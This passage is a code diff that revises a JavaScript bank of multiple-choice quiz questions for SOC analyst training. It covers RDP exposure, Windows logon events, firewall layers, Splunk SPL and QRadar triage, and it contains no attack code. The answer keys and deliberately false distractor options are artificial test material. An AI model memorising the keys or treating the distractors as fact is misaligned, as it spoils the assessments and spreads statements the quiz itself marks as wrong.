         "question": "A vulnerability scan reports that a Windows server has TCP port 3389 open to the entire internet. Why is this considered a critical finding, and what is the correct remediation?",
         "options": [
           {
-            "label": "It is minor, because port 3389 only allows read-only screen viewing and can never give an attacker interactive control or a path to deploy ransomware.",
+            "label": "Minor — port 3389 only serves read-only screen viewing, so an attacker could watch the desktop but never gain interactive control or deploy ransomware.",
             "value": "a"
           },
           {
-            "label": "Exposed RDP is a top ransomware entry point via brute force and exploits like BlueKeep; put RDP behind a VPN/jump host, enforce NLA + MFA, and patch.",
+            "label": "Exposed RDP is a top ransomware entry via brute force and exploits like BlueKeep; put RDP behind a VPN or jump host, enforce NLA plus MFA, and patch.",
             "value": "b"
           },
           {
-            "label": "It is expected, because best practice is to expose RDP directly to the internet so administrators worldwide can always reach the server without a VPN.",
+            "label": "Expected and fine, since exposing 3389 directly lets administrators worldwide reach the server without the overhead of a VPN or gateway.",
             "value": "c"
           },
           {
-            "label": "The fix is simply to change the RDP password monthly, since an internet-exposed 3389 poses no risk as long as the password is rotated on a schedule.",
+            "label": "Low risk as long as the RDP password is rotated monthly, since regular password changes fully mitigate an internet-exposed port 3389.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "An internet-exposed port 3389 is a critical finding because attackers constantly scan for open RDP and break in via brute force/credential stuffing or exploits like BlueKeep, making it a leading ransomware entry point; the correct remediation is to remove direct exposure (VPN, jump host, or RD Gateway), enforce NLA and MFA, and patch. The 'it is minor' option wrongly claims RDP is read-only. The 'expose RDP directly' option states the opposite of best practice. Rotating the password monthly is insufficient because exposure itself — not just password age — is the core risk."
+        "explanation": "Correct: internet-exposed RDP is a leading initial-access vector for ransomware through credential brute force and pre-auth exploits like BlueKeep, so the fix is to remove direct exposure (VPN or RD Gateway/jump host), enforce NLA and MFA, and keep it patched. The read-only option is false: RDP gives full interactive control, exactly what an intruder wants. The expected-and-fine option endorses the dangerous exposure the finding is flagging. The monthly-password option is insufficient — rotation does nothing against brute force in progress or an unauthenticated exploit, and the port stays exposed."
       },
       {
         "question": "An organisation wants remote workers to reach internal RDP servers without ever exposing port 3389 to the internet. Which architecture achieves this, and how does it work?",
         "options": [
           {
-            "label": "A Remote Desktop Gateway, which wraps RDP traffic inside HTTPS on port 443 so external users authenticate to the Gateway before it relays them internally.",
+            "label": "A Remote Desktop Gateway, which tunnels RDP inside HTTPS on port 443 so external users authenticate to the Gateway before it relays them to internal hosts.",
             "value": "a"
           },
           {
-            "label": "Session shadowing, which lets one administrator silently view another user's desktop and therefore removes the need for any external RDP connection entirely.",
+            "label": "Moving the RDP listener from port 3389 to port 3390, so external scanners looking for 3389 no longer find the service to brute-force.",
             "value": "b"
           },
           {
-            "label": "Clipboard redirection, which copies files between the client and server directly and therefore makes opening port 3389 externally completely unnecessary.",
+            "label": "Publishing RD Web Access on its own, which shows a web page of available desktops and so removes any need to expose the RDP port.",
             "value": "c"
           },
           {
-            "label": "Anonymous FTP access, which allows remote workers to upload their desktop session as a file instead of connecting through the RDP protocol at all.",
+            "label": "A split-tunnel VPN configured so that only RDP traffic skips the tunnel and reaches port 3389 directly across the internet.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "A Remote Desktop Gateway wraps RDP traffic inside HTTPS on port 443, so external users connect to and authenticate against the Gateway over a standard web connection, which then relays them internally to the target machine's RDP port — meaning 3389 itself is never exposed to the internet. The session-shadowing option describes shadowing, a within-session viewing feature unrelated to external exposure. The clipboard option describes clipboard redirection, a file-sharing convenience, not an access architecture. The anonymous FTP option invents an irrelevant FTP-based mechanism that has nothing to do with RDP."
+        "explanation": "Correct: a Remote Desktop Gateway wraps RDP inside HTTPS on 443 and authenticates external users at the Gateway, which then relays them to internal servers — so port 3389 is never exposed to the internet. The port-change option is security by obscurity: the service is still internet-exposed on 3390 and still brute-forceable once found. The RD Web Access option is wrong on its own — it is just a portal listing desktops; the actual RDP connection still needs a Gateway to avoid exposing the port. The split-tunnel option does the opposite of the goal, sending RDP straight to 3389 over the internet."
       },
       {
         "question": "While hunting RDP activity you find hundreds of Event ID 1149 ('User authentication succeeded') entries from one external IP in the TerminalServices-RemoteConnectionManager log, but only a handful of Security-log Event ID 4624 (LogonType 10) entries. How should you interpret the 1149 events?",
         "options": [
           {
-            "label": "Event 1149 marks that an RDP connection channel was established and a username was presented, not that the logon truly succeeded; confirm real access by correlating with a Security 4624 LogonType 10 — so this pattern looks like brute forcing with few actual successes.",
+            "label": "Event 1149 shows an RDP channel opened and a username was presented, not a confirmed logon; confirm real access via a Security 4624 type 10 — so this looks like brute forcing with few hits.",
             "value": "a"
           },
           {
-            "label": "Each Event 1149 is a confirmed successful interactive logon, so hundreds of them prove hundreds of attackers are simultaneously logged in and the 4624 events can be ignored entirely.",
+            "label": "Each 1149 means NLA authentication succeeded, so treat all of them as full logons and dismiss the sparse 4624 events as a logging gap.",
             "value": "b"
           },
           {
-            "label": "Event 1149 is generated only by Windows Update, so hundreds of them simply mean the server patched itself many times and no RDP access of any kind occurred.",
+            "label": "Event 1149 is written only once a full interactive desktop loads, so hundreds of them prove hundreds of completed sessions regardless of the 4624 count.",
             "value": "c"
           },
           {
-            "label": "Event 1149 records outbound DNS queries from the server, so the count reflects name-resolution traffic and has nothing to do with remote desktop connections.",
+            "label": "Event 1149 counts reconnects to existing disconnected sessions, so the volume just reflects one user repeatedly dropping and resuming a single desktop.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Despite its label, Event ID 1149 fires when the RDP connection channel is established and a username is presented — before credentials are actually validated — so a brute-force generates a 1149 per attempt regardless of success; real authenticated access is confirmed only by a Security-log 4624 LogonType 10, and hundreds of 1149s against few 4624s is the brute-force-with-rare-success shape. The 'confirmed successful logon' option wrongly treats 1149 as a confirmed logon. The Windows Update option invents a Windows Update origin. The DNS-queries option misattributes it to DNS."
+        "explanation": "Correct: Event 1149 only shows that an RDP connection channel reached the point of presenting a username, not that the logon truly succeeded, so you confirm real access by correlating with Security 4624 type 10 — here, hundreds of 1149s against a handful of 4624s looks like brute forcing with few actual break-ins. The NLA option over-reads 1149 as a confirmed logon and wrongly waves away the authoritative Security events. The full-desktop option is wrong about when 1149 fires — it precedes a confirmed interactive logon. The reconnect option mislabels 1149 as a session-resume counter, which is not what the event records."
       }
     ],
     "references": [
@@ -10137,70 +10229,70 @@ const NEW_TOPIC_LESSONS = [
         "question": "An analyst says a web application firewall (WAF) is needed because a network firewall that filters only by IP address and port cannot stop a SQL injection attack. Using the layer model, why is this correct?",
         "options": [
           {
-            "label": "SQL injection is a Layer 1 physical-cabling attack, so only a WAF that inspects electrical signals on the wire can detect and block it.",
+            "label": "SQL injection is a Layer 6 (presentation) attack that abuses how data is encoded, so only a device decoding at Layer 6 can detect and block it.",
             "value": "a"
           },
           {
-            "label": "A network firewall works at Layer 3/4 (IP and port), but SQL injection is a Layer 7 application attack hidden in HTTP content that only a Layer 7 WAF can inspect.",
+            "label": "A port-based network firewall works at Layer 3/4 (IP and port), but SQL injection rides inside Layer 7 HTTP content that only a Layer 7 WAF can inspect.",
             "value": "b"
           },
           {
-            "label": "SQL injection operates at Layer 4 (ports), so the network firewall already blocks it and the WAF is redundant and provides no additional protection.",
+            "label": "SQL injection is a Layer 4 attack against the database's TCP port, so tightening the firewall's port rules stops it and makes a WAF unnecessary.",
             "value": "c"
           },
           {
-            "label": "A WAF and a network firewall both operate only at Layer 3, so they are interchangeable and either one alone fully stops SQL injection attacks.",
+            "label": "SQL injection is a Layer 3 attack on the server's IP address, so an IP allow-list on the network firewall blocks it just as a WAF would.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "A network firewall operates at Layer 3/4, allowing or denying by IP address and port, so it cannot see the malicious payload inside an HTTP request; SQL injection is a Layer 7 (application) attack, so you need a Layer 7 WAF that inspects the actual application content. The Layer 1 option wrongly places SQL injection at the physical layer. The Layer 4 option incorrectly claims a port-based firewall stops an application-layer attack. The 'both at Layer 3' option is wrong because a WAF operates at Layer 7, not Layer 3, and they are not interchangeable."
+        "explanation": "Correct: a port-based firewall decides at Layer 3/4 using IP and port, but a SQL injection payload lives in the Layer 7 HTTP request body, so only a Layer 7 WAF that parses the application content can catch it. The Layer 6 option misplaces the attack — the malicious SQL is application data at Layer 7, not an encoding issue at the presentation layer. The Layer 4 option is wrong: blocking or allowing the database port says nothing about the attack text carried inside an allowed HTTP request. The Layer 3 option is wrong too: the payload is not in the IP header, so an IP allow-list never inspects it."
       },
       {
         "question": "What is the most accurate description of the relationship between the OSI model and the TCP/IP model?",
         "options": [
           {
-            "label": "They are competing protocols, and a network must be configured to use either OSI or TCP/IP but can never use concepts from both at the same time.",
+            "label": "They are rival protocol stacks, so a network runs one or the other and a TCP/IP host cannot interoperate with an OSI host at all.",
             "value": "a"
           },
           {
-            "label": "OSI is a 7-layer conceptual reference model for teaching/troubleshooting, while TCP/IP is the practical 4-layer model the internet actually runs on; their layers map onto each other.",
+            "label": "OSI is a 7-layer conceptual model for teaching and troubleshooting; TCP/IP is the practical 4-layer model the internet runs on, and their layers map onto each other.",
             "value": "b"
           },
           {
-            "label": "TCP/IP has seven layers and OSI has four, and TCP/IP is only a teaching model while OSI is the protocol suite that the modern internet is actually built on.",
+            "label": "TCP/IP is the 7-layer teaching model and OSI is the 4-layer model the internet is actually built on, so the two names are simply swapped.",
             "value": "c"
           },
           {
-            "label": "They are identical in every respect, with the same number of layers and the same names, so the two terms are fully interchangeable with no differences at all.",
+            "label": "TCP/IP has four layers but merges OSI layers 1 through 3 into one link layer, so the two models cannot be mapped to each other.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "OSI is a 7-layer conceptual reference model used for teaching and troubleshooting, while TCP/IP is the practical 4-layer model actually implemented and run by the internet; their layers map onto each other (TCP/IP Application = OSI 5-7, Link = OSI 1-2). The 'competing protocols' option is wrong because OSI is a model, not a competing protocol you choose instead of TCP/IP. The 'TCP/IP has seven layers' option reverses their layer counts and roles. The 'identical in every respect' option is false because they differ in layer count and purpose."
+        "explanation": "Correct: OSI is the 7-layer conceptual model used to teach and troubleshoot, TCP/IP is the 4-layer model the internet actually runs on, and the two line up — TCP/IP's application layer spans OSI 5–7, and so on. The rival-stacks option is wrong: they are not competing protocols you choose between; TCP/IP is what runs while OSI describes it. The swapped-counts option simply reverses the true layer counts. The merge option gets the direction wrong — TCP/IP combines OSI's physical and data-link layers into one link layer and keeps the network layer, and the models do map onto each other."
       },
       {
         "question": "A firewall log shows a connection was 'allowed' to an internal web server, yet the attack actually succeeded through a malicious parameter hidden inside the HTTP request itself. Why did the firewall log show 'allowed' rather than catching the attack?",
         "options": [
           {
-            "label": "Firewalls typically inspect only up to Layer 3/4 (IP address and port), so they permit the connection without ever unwrapping the Layer 7 HTTP content.",
+            "label": "A traditional port-based network firewall inspects only up to Layer 3/4 (IP and port), so it permits the connection without ever unwrapping the Layer 7 HTTP content.",
             "value": "a"
           },
           {
-            "label": "The firewall log is corrupted, because a properly functioning firewall always inspects every layer, including the full HTTP request body, by default.",
+            "label": "The request used HTTPS, so the firewall saw only encrypted bytes and allowed it because it could not read the malicious parameter inside.",
             "value": "b"
           },
           {
-            "label": "Layer 7 attacks cannot travel over TCP connections, so the firewall correctly allowed the traffic since no attack could exist inside it at all.",
+            "label": "The malicious parameter sat in the TCP header at Layer 4, which the firewall passes through untouched whenever the destination port is allowed.",
             "value": "c"
           },
           {
-            "label": "The web server's MAC address was spoofed at Layer 2, which is the only way an HTTP-based attack could ever bypass a network firewall's inspection.",
+            "label": "The firewall checked the request against its signature database, found no known-bad pattern, and therefore logged the connection as allowed.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "A typical network firewall makes its allow/deny decision at Layer 3/4 — source/destination IP and port — without unwrapping the Layer 7 application payload, so a connection can be legitimately 'allowed' at that layer while still carrying a malicious HTTP request inside; catching that requires a Layer 7 tool like a WAF. The corrupted-log option is wrong because this is normal firewall behaviour, not corruption. The claim that Layer 7 attacks cannot travel over TCP is false since Layer 7 attacks (like SQL injection) travel inside ordinary TCP connections constantly. The MAC-spoofing option invents an unrelated Layer 2 MAC-spoofing explanation."
+        "explanation": "Correct: a traditional port-based firewall makes its decision at Layer 3/4, so once the IP and port are permitted it forwards the traffic without ever parsing the Layer 7 HTTP body where the malicious parameter lives. The HTTPS option blames encryption, but a port-based firewall would miss a Layer 7 payload even in plaintext — the limitation is the layer, not the encryption. The TCP-header option misplaces the parameter: HTTP parameters are Layer 7 application data, not fields in the Layer 4 header. The signature-database option describes an IPS/WAF behaviour, not a basic network firewall, which does not inspect application content at all."
       }
     ],
     "references": [
@@ -10268,50 +10360,142 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "A brand-new analyst is told Splunk is 'the SIEM'. In one sentence, what does a SIEM fundamentally do, and why does a SOC need one?",
+        "question": "A colleague’s search `EventCode=4625 user=administrator`, run with the time picker on “All time”, is still spinning after several minutes. They are investigating an alert that fired at 09:14 today. Which change best fixes the speed while still returning the events they need?",
         "options": [
           {
-            "label": "It is antivirus software installed on each laptop that blocks malware locally, so the SOC needs one on every endpoint to stop infections.",
+            "label": "Add `| table _time, user, src_ip` so Splunk returns fewer columns and can finish the search sooner.",
             "value": "a"
           },
           {
-            "label": "It collects logs (event records) from machines all across the environment into one central, searchable place, so an analyst can investigate activity spread across many devices from one search bar.",
+            "label": "Name the index (e.g. `index=windows`) in the base search and set the time picker around 09:14.",
             "value": "b"
           },
           {
-            "label": "It is a firewall that sits at the network edge and allows or blocks connections, so the SOC needs one to keep attackers out of the network entirely.",
+            "label": "Replace the field filters with the keyword `failed`, since a keyword search skips field extraction.",
             "value": "c"
           },
           {
-            "label": "It is a ticketing system that assigns work to analysts, so the SOC needs one purely to track who is handling which task during a shift.",
+            "label": "Rewrite it as `index=* | where EventCode=4625`, so the filter runs on the results after retrieval.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "A SIEM (Security Information and Event Management) centralises logs from across the whole environment into one searchable place, so an analyst can investigate activity that is spread across many machines without visiting each one — which is exactly what Splunk provides for a SOC. The 'installed on each laptop' option describes antivirus/EDR, a different control. The network-edge option describes a firewall. The work-assignment option describes a ticketing/case system. Only the central log collection answer captures the collect-everything-and-search-it purpose of a SIEM."
+        "explanation": "A search with no index reads every bucket, and “All time” reads months of data; scoping by index and setting the time picker to the incident window are the two habits the lesson calls the biggest speed levers, and a tight window also keeps the relevant events from being buried. Adding `table` only chooses which columns to display after the events have already been retrieved, so it does not reduce the work. The keyword `failed` is less precise, matching “backup failed” and thousands of other irrelevant lines, and it does not narrow the buckets or the time. Moving the filter after the pipe is backwards: the base search is the only part that reads stored data, so filtering late makes Splunk haul everything first."
       },
       {
-        "question": "You want to find, in the Windows Security log, source IPs that produced more than 20 failed logons. Which SPL query is correct AND efficient, and why?",
+        "question": "You want source IPs that produced more than 20 failed logons in the Windows Security log. Which SPL query is both correct and efficient?",
         "options": [
           {
-            "label": "index=windows EventCode=4625 | stats count by src_ip | where count > 20 — it filters to failed logons in the base search first, then aggregates and thresholds the smaller result set (filter early, transform late).",
+            "label": "`index=windows EventCode=4625 | stats count by src_ip | where count > 20`",
             "value": "a"
           },
           {
-            "label": "index=windows | stats count by src_ip | where EventCode=4625 — it aggregates every Windows event first and applies the EventCode filter at the very end, which is the accurate order.",
+            "label": "`index=windows | stats count by src_ip | where EventCode=4625 AND count > 20`",
             "value": "b"
           },
           {
-            "label": "count > 20 | src_ip | EventCode=4625 index=windows — SPL reads right to left, so the index and event filters must appear last in the pipeline.",
+            "label": "`index=windows | search EventCode=4625 | stats count by src_ip | where count > 20`",
             "value": "c"
           },
           {
-            "label": "index=windows EventCode=4625 | table src_ip — a table command is required because stats cannot group events by a field like src_ip.",
+            "label": "`index=windows EventCode=4625 | table src_ip, user | where count > 20`",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "The efficient query filters to EventCode=4625 in the base search so only failed logons are retrieved, then uses stats count by src_ip and where count > 20 on that small set — the filter-early, transform-late habit. Filtering on EventCode after stats is wrong because once stats aggregates the data, EventCode is gone so you cannot filter on it, and reading all events first is slow. The right-to-left query reverses SPL's left-to-right order. The table-command query is wrong because stats can group by a field, and table only chooses columns, it does not count."
+        "explanation": "The key filters to EventCode=4625 in the base search, so only failed logons are retrieved, then counts per src_ip and keeps those above 20 — filter early, transform late. The query that filters on EventCode after stats is wrong: once stats has aggregated the events, the EventCode field no longer exists in the result table, so the condition cannot match. The query with `| search EventCode=4625` after the pipe returns the right answer but retrieves every Windows event first and filters afterwards, which is the slow pattern the lesson warns against. The `table` query never creates a count field — table only chooses columns — so `where count > 20` has nothing to test."
+      },
+      {
+        "question": "You run `index=firewall dest_ip=203.0.113.44 | timechart span=1m count` for an external address. The graph is a flat line: one internal host makes exactly 3 outbound connections to it every minute for nine hours straight, including overnight. What does this shape most likely suggest?",
+        "options": [
+          {
+            "label": "Normal use, since a steady count shows a user working at an even pace throughout the day.",
+            "value": "a"
+          },
+          {
+            "label": "A brute-force attempt, since password guessing produces a constant connection rate to one server.",
+            "value": "b"
+          },
+          {
+            "label": "Possible beaconing, since software checking in on a schedule draws a flat, regular line.",
+            "value": "c"
+          },
+          {
+            "label": "A search error, since timechart should show gaps for the hours when nobody uses the host.",
+            "value": "d"
+          }
+        ],
+        "answer": "c",
+        "explanation": "The lesson’s tell for beaconing is the shape: malware phoning home on a schedule draws a flat, perfectly regular line, while human traffic is bursty and uneven — and a person does not keep an identical rhythm overnight. The normal-use reading ignores exactly that: real users produce irregular peaks and quiet periods. The brute-force reading confuses this with a different pattern — the lesson detects brute force through bursts of failed logons (4625) per user and source, not a steady trickle of connections to one destination. The search-error reading treats the evidence as a malfunction: timechart counts what happened, and the regular overnight activity is the finding."
+      },
+      {
+        "question": "You have a side table of known-bad IP addresses from threat intelligence, and you want every firewall event to show whether its dest_ip appears on that list. Which SPL command is built for this?",
+        "options": [
+          {
+            "label": "`rare`, which surfaces the least common dest_ip values so that unusual destinations stand out",
+            "value": "a"
+          },
+          {
+            "label": "`rex`, which pulls a new field out of the raw event text using a regular-expression pattern",
+            "value": "b"
+          },
+          {
+            "label": "`eval`, which creates a new field by computing it from values already present in the event",
+            "value": "c"
+          },
+          {
+            "label": "`lookup`, which matches a field against a side table and adds that table’s columns to each event",
+            "value": "d"
+          }
+        ],
+        "answer": "d",
+        "explanation": "`lookup` enriches events against a side table — the lesson’s own example is matching an IP to a threat-intel list. `rare` is a useful hunting command, but it ranks values by how uncommon they are in your data; it knows nothing about an external list of bad IPs. `rex` extracts a field from raw text, which helps when a field is missing, not when you need to compare it with another table. `eval` computes new fields from data already in the event, and the threat-intel list is not in the event."
+      },
+      {
+        "question": "In Splunk Enterprise Security, a user generates five low-severity signals over three days, and none of them on its own raised an alert. On the third day a Notable Event appears for that user. What most likely produced it?",
+        "options": [
+          {
+            "label": "Risk-Based Alerting: each signal added risk to the user, and the running total crossed a threshold.",
+            "value": "a"
+          },
+          {
+            "label": "A dashboard panel, which raises a Notable Event whenever the chart it draws goes past a set value.",
+            "value": "b"
+          },
+          {
+            "label": "A scheduled alert that emailed the team, since ES records every emailed alert as a Notable Event.",
+            "value": "c"
+          },
+          {
+            "label": "Incident Review, which scans the indexes itself and creates Notable Events for analysts to work.",
+            "value": "d"
+          }
+        ],
+        "answer": "a",
+        "explanation": "Risk-Based Alerting adds up risk against a user or host over time and raises a notable when the accumulated risk crosses a line, which is how ES catches slow activity that no single event would trip. A dashboard is a set of saved searches drawn as panels for at-a-glance viewing; it does not create notables. A scheduled alert can email or open a ticket, but in ES it is a correlation search match that creates the Notable Event, not the email. Incident Review is the queue where analysts work notables, not the engine that searches for them."
+      },
+      {
+        "question": "Your brute-force search returns user j.doe from src_ip 198.51.100.7 with 64 failed logons (EventCode 4625) in ten minutes. What is the most important next check before deciding how serious this is?",
+        "options": [
+          {
+            "label": "Whether other users also show 4625 failures in the same index over the past seven days",
+            "value": "a"
+          },
+          {
+            "label": "Whether the same user and src_ip then produced a 4624 successful logon shortly afterwards",
+            "value": "b"
+          },
+          {
+            "label": "Whether the same search over “All time” shows the failures have happened before as well",
+            "value": "c"
+          },
+          {
+            "label": "Whether `rare` lists 198.51.100.7 among the least common source IPs in the proxy index",
+            "value": "d"
+          }
+        ],
+        "answer": "b",
+        "explanation": "The lesson’s crucial follow-up is whether the same user and src_ip then produced a 4624: many failures followed by a success is a brute force that worked — a likely compromise and a much bigger deal than failures alone. Checking other users’ failures over a week may reveal a wider spray, but it does not tell you whether this account was breached. Re-running over “All time” is slow and answers a background question, not the one that decides severity. The proxy-index `rare` check looks at the wrong data source for a Windows logon question and still leaves the success question open."
       }
     ],
     "references": [
@@ -10379,73 +10563,119 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "What most fundamentally distinguishes how a SOC analyst starts their day in QRadar versus a search-bar SIEM, and why?",
+        "question": "Compared with a search-first SIEM, where does a SOC analyst's shift normally start in QRadar, and why?",
         "options": [
           {
-            "label": "In QRadar you must write an AQL query before seeing any data, because QRadar has no correlation engine and never groups related events together.",
+            "label": "In Log Activity, quick-filtering the live raw events for anything suspicious before rules have run",
             "value": "a"
           },
           {
-            "label": "QRadar starts you at prioritised Offenses — correlated incidents its rules already built and scored by Magnitude — rather than at an empty search bar, so you triage ready-made incidents first.",
+            "label": "In the Offenses queue: incidents its rules already correlated and ranked by Magnitude, worked top-down",
             "value": "b"
           },
           {
-            "label": "QRadar only stores network flows and no device logs, so an analyst can never investigate a Windows logon or a firewall event within the tool.",
+            "label": "In Network Activity, because flows exist even where no device wrote a log, so they show everything first",
             "value": "c"
           },
           {
-            "label": "QRadar disables all filtering and drill-down, so once an Offense opens the analyst cannot narrow down to the specific events that caused it.",
+            "label": "With an AQL hunt, because AQL is SQL-like, so writing the day's searches from scratch is the core task",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "QRadar's defining trait is that its rules correlate raw events/flows into Offenses scored by Magnitude, so the analyst starts at a prioritised incident queue and drills down — the opposite of a search-first tool that starts you at a blank query. The 'must write an AQL query first' option is wrong because QRadar's whole point is its correlation engine, and you can browse Log Activity without AQL. The 'only stores network flows' option is false because QRadar ingests both events (logs) and flows. The 'disables all filtering' option is wrong because Log Activity supports quick-filter, right-click, and AQL drill-down."
+        "explanation": "QRadar is correlation-first: CRE rules group related events and flows into Offenses scored by Magnitude, so the analyst starts at a prioritised incident queue and drills down from there. The Log Activity option describes a real tab, but it is where you pivot once an Offense sends you looking, not where the shift begins. The Network Activity option states a true fact about flows and draws the wrong conclusion; flows are one data source you drill into, not the starting queue. The AQL option describes the search-first habit of a tool like Splunk; in QRadar, AQL is used to drill into specific Offenses."
       },
       {
-        "question": "An Offense in QRadar has a high Magnitude. What does Magnitude represent, and how should it shape your triage?",
+        "question": "The same QRadar rule creates two Offenses with the same number of contributing events: one against a domain controller, one against a disused test VM. The domain-controller Offense has a markedly higher Magnitude. What explains the difference, and what does it mean for triage?",
         "options": [
           {
-            "label": "The number of raw bytes in the offense's network flows, so you should investigate whichever offense transferred the most data regardless of its risk.",
+            "label": "Severity alone: Magnitude is the firing rule's severity, so tuning which assets matter cannot reorder the queue",
             "value": "a"
           },
           {
-            "label": "A priority score computed from severity, credibility, and relevance, so you work the Offense queue top-down by Magnitude, most urgent first.",
+            "label": "Relevance: Magnitude weighs asset importance with severity and credibility, so work the DC Offense first",
             "value": "b"
           },
           {
-            "label": "The alphabetical order of the rule name that created it, so Magnitude simply determines where the offense appears in the list, not its importance.",
+            "label": "Event count: Magnitude counts contributing events, so the DC Offense must have gathered more of them",
             "value": "c"
           },
           {
-            "label": "The number of days the offense has been open, so a high Magnitude only means the offense is old and can safely be closed without review.",
+            "label": "Creation time: Magnitude ranks Offenses by age, so the DC Offense was created first and is worked first",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Magnitude is QRadar's priority score, combining severity (potential damage), credibility (confidence it is real), and relevance (importance of the affected asset), so analysts work the Offense queue top-down by Magnitude to hit the most urgent incidents first. The raw-bytes option wrongly equates it with flow bytes. The rule-name order option invents an alphabetical scheme. The 'days open' option is dangerously wrong — high Magnitude signals urgency, not age or a reason to auto-close."
+        "explanation": "Magnitude combines severity (how damaging the activity would be), credibility (how confident QRadar is that it is real) and relevance (how important the affected asset is). With the same rule and the same event volume, the asset is the difference: a domain controller is far more relevant than a disused test VM, so its Offense ranks higher and should be worked first. The 'severity alone' option ignores relevance; telling QRadar which servers are high-value is exactly how a SOC tunes Magnitude. The event-count option contradicts the stem (same number of events), and Magnitude is not a raw count. The creation-time option confuses priority with age; the queue is ordered by Magnitude, not by when Offenses were created."
       },
       {
-        "question": "During an investigation you confirm an IP address is malicious and want every currently active QRadar rule that checks a watchlist to treat it as bad immediately, without editing or redeploying any rule. Which feature achieves this, and why does it work without touching rule logic?",
+        "question": "During an investigation you confirm an IP address is malicious and want every active QRadar rule that checks your watchlist to treat it as bad immediately, without editing or redeploying any rule. Which action achieves this?",
         "options": [
           {
-            "label": "Add the IP to the relevant reference set — rules test membership in the reference set dynamically, so updating the set's contents immediately changes what every referencing rule matches, with no rule redeployment needed.",
+            "label": "Add the IP to the reference set those rules test, since membership is checked live with no rule change",
             "value": "a"
           },
           {
-            "label": "Edit the Ariel database directly to insert the IP into every stored event, which only retroactively changes past search results and has no effect on rules evaluating new incoming traffic.",
+            "label": "Create a building block that holds the IP, since building blocks update every rule that references them",
             "value": "b"
           },
           {
-            "label": "Create a brand-new building block containing only this IP and manually re-add it to every existing rule one at a time, since building blocks cannot be referenced by rules that already exist.",
+            "label": "Run an AQL search using REFERENCESETCONTAINS on the IP, which adds it to the watchlist those rules use",
             "value": "c"
           },
           {
-            "label": "Raise the Magnitude of every open Offense that already mentions the IP, since Magnitude is the only mechanism QRadar provides for tracking newly confirmed malicious indicators.",
+            "label": "Raise the severity of the Offenses that involve the IP, so the CRE treats it as bad in later rule tests",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "A reference set is a dynamic list that rules and AQL queries check membership against; adding a value to it immediately changes the outcome of every rule test that references that set, with no need to edit or redeploy the rules themselves. The Ariel-editing option misunderstands Ariel as something you edit by hand to affect live detection. The new-building-block option wrongly claims building blocks cannot be reused by existing rules — reusability is their entire purpose. The Magnitude option confuses Magnitude (a priority score) with a mechanism for tracking indicators."
+        "explanation": "A reference set is a dynamic list that rule tests and AQL queries check membership against; adding a value immediately changes the outcome of every test that references that set, with no rule edit or redeployment. The building-block option misapplies a true fact: updating an existing building block does update the rules that reference it, but a new building block is referenced by no existing rule, and the watchlist rules test the reference set. The REFERENCESETCONTAINS option confuses checking membership with adding to the set; the function only reads it. The severity option changes how existing Offenses are prioritised, not what future rule tests match."
+      },
+      {
+        "question": "An analyst adapts the lesson's brute-force AQL query but moves the threshold into the filter: WHERE qid = 5000023 AND failures > 20, keeping the GROUP BY sourceip, username. Why does this not work, and what is the fix?",
+        "options": [
+          {
+            "label": "The threshold belongs in ORDER BY failures DESC, which drops the groups below the top 20 results",
+            "value": "a"
+          },
+          {
+            "label": "The numeric qid blocks counting; switch the filter to QIDNAME(qid) so that failures can be compared",
+            "value": "b"
+          },
+          {
+            "label": "WHERE filters single events before grouping, when no count exists yet; the threshold goes in HAVING",
+            "value": "c"
+          },
+          {
+            "label": "LAST 1 HOURS must come before WHERE, because AQL has to apply the time window before any filtering",
+            "value": "d"
+          }
+        ],
+        "answer": "c",
+        "explanation": "WHERE filters individual event rows before they are grouped, so a per-group count such as failures does not exist yet at that point. HAVING filters the grouped results, which is why the lesson's query keeps the threshold in HAVING failures > 20 (the AQL equivalent of SPL's | where count > 20 after stats). The ORDER BY option confuses sorting with filtering: ORDER BY only orders the groups and removes none. The QIDNAME option misreads the problem; QIDNAME makes results readable or lets you filter by name, but the numeric qid filter works fine. The LAST 1 HOURS option inverts AQL's structure, where the time clause trails the query."
+      },
+      {
+        "question": "A new firewall log source was added yesterday. In Log Activity its events show raw, unparsed payloads, and an AQL search on sourceip returns nothing for it, yet Network Activity shows flows from that same network segment. What is the most likely explanation?",
+        "options": [
+          {
+            "label": "The CRE has no rule for this device yet, and QRadar parses an event once a rule has matched it",
+            "value": "a"
+          },
+          {
+            "label": "QRadar keeps firewall data as flows, so these events will not become searchable in Log Activity",
+            "value": "b"
+          },
+          {
+            "label": "AQL searches events after a 24-hour indexing delay, so the new source is not queryable until then",
+            "value": "c"
+          },
+          {
+            "label": "Its DSM is not set up, so the Event Collector cannot normalise its fields; flows use a separate pipeline",
+            "value": "d"
+          }
+        ],
+        "answer": "d",
+        "explanation": "DSM normalisation happens at the Event Collector, before anything reaches the CRE or Ariel. Until the right DSM parses this vendor's format, the events arrive with raw unparsed fields, so normalised fields such as sourceip are empty. Flows come from the separate Flow Collector/QFlow pipeline, which is why Network Activity still shows the segment's traffic. The CRE option reverses the order: events are normalised first and rules run on the normalised stream. The 'firewall data as flows' option is false; firewall logs are events, stored and searched in Log Activity. The 24-hour option invents an indexing delay; AQL queries recent windows such as LAST 1 HOURS."
       }
     ],
     "references": [
@@ -11064,96 +11294,142 @@ const NEW_TOPIC_LESSONS = [
   ],
   "quiz": [
     {
-      "question": "An analyst sees Event ID 4799 fire on a workstation, with GroupName \"Administrators\" and CallerProcessName \"C:\\Windows\\System32\\net.exe\", two minutes after the same account clicked a phishing link. What makes this combination worth escalating, given that 4799 also fires constantly for entirely benign reasons?",
+      "question": "An analyst sees Event ID 4799 on a workstation with SubjectUserName j.ramos, GroupName “Administrators”, GroupDomain “Builtin” and CallerProcessName “C:\\Windows\\System32\\net.exe”, two minutes after j.ramos clicked a phishing link. Given that 4799 also fires constantly for benign reasons, which reading best justifies escalating it?",
       "options": [
         {
